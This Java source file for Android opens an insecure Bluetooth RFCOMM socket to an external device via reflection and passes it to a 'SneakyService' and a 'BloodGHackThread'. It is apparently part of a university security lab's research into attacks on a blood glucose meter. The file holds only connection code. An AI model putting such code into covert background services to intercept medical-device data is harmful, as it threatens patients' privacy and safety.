package edu.illinois.seclab.extDroid.bghack;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.UUID;

import edu.illinois.seclab.extDroid.passAttack.ExtDevice;
import edu.illinois.seclab.extDroid.passAttack.SneakyService;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothSocket;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;


/**
 * 
 * @author soteris demetriou
 *
 */
public class BGConnectThread extends Thread {
		private static final String TAG = "ConnectThread";
	    private BluetoothSocket mmSocket;
	    private final BluetoothDevice mmDevice;
	    private final BluetoothAdapter mBluetoothAdapter;
		private int connect_mode;
		private ExtDevice extDevice;
	    public static Handler handler;
	    
	 
	    public BGConnectThread(BluetoothDevice device, ExtDevice extDevice, UUID myUuid, BluetoothAdapter bluetoothAdapter, int mode) {
	        // Use a temporary object that is later assigned to mmSocket,
	        // because mmSocket is final
	    	Log.i(TAG, "ConnectThread created.");
	    	
	        BluetoothSocket tmp = null;
	        mmDevice = device;
	        mBluetoothAdapter = bluetoothAdapter;
	        this.connect_mode = mode;
	        this.extDevice = extDevice;
	        
	        try
	        {
	          if (Build.VERSION.SDK_INT > 9)
	          {
	            Class localClass = this.mmDevice.getClass();
	            Class[] arrayOfClass = new Class[1];
	            arrayOfClass[0] = Integer.TYPE;
	            Method localMethod = localClass.getMethod("createInsecureRfcommSocket", arrayOfClass);
	            BluetoothDevice localBluetoothDevice = this.mmDevice;
	            Object[] arrayOfObject = new Object[1];
	            arrayOfObject[0] = Integer.valueOf(1);
	            this.mmSocket = ((BluetoothSocket)localMethod.invoke(localBluetoothDevice, arrayOfObject));
	            return;
	          }
	          else{
	        	  this.mmSocket = mmDevice.createRfcommSocketToServiceRecord(myUuid);
	          }
	        }
	        catch (Exception localException)
	        {
	          Log.i("TAG","create() failed" + localException.getMessage());
	          this.mmSocket = null;
	          return;
	        }

	    }
	 
	    public void run() {
	        // Cancel discovery because it will slow down the connection
	        mBluetoothAdapter.cancelDiscovery();
	 
	        try {
	            // Connect the device through the socket. This will block
	            // until it succeeds or throws an exception
	            mmSocket.connect();
	            //MainActivity.connected = true;
	            Log.i(TAG, "Connection Established");
	            
	            Message msg = new Message();
	            msg.what = SneakyService.CONN_SUCCESS;
	            Bundle b = new Bundle();
	            b.putInt(SneakyService.CON_ONCE_LBL, connect_mode);            
	            SneakyService.sshandler.sendMessage(msg);
	            
	         // Do work to manage the connection (in a separate thread)
	            manageConnectedSocket(mmSocket);
	        } catch (IOException connectException) {
	            // Unable to connect; close the socket and get out
	        	Log.i(TAG, "Connection Failed");
	 
	        	connectException.printStackTrace();
	        	
	        	Message msg = new Message();
	            msg.what = SneakyService.CONN_FAIL;
	            Bundle b = new Bundle();
	            b.putInt(SneakyService.CON_ONCE_LBL, connect_mode);            
	            SneakyService.sshandler.sendMessage(msg);
	            
	            return;
	        }
	 
	    }
	 
	    /**
	     * Initiate ConnectedThread
	     * @param mmSocket2
	     */
	    private void manageConnectedSocket(BluetoothSocket mmSocket2) {
			// TODO Auto-generated method stub
			
//	    	if(SneakyService.poThread != null){
//	    		SneakyService.bgThread.cancel();
//	    	}
	    	
	    	SneakyService.bgThread = new BloodGHackThread(mmSocket2);
	    	SneakyService.bgThread.start();
		}

		/** Will cancel an in-progress connection, and close the socket */
	    public void cancel() {
	        try {
	            mmSocket.close();
	        } catch (IOException e) { }
	    }
	}

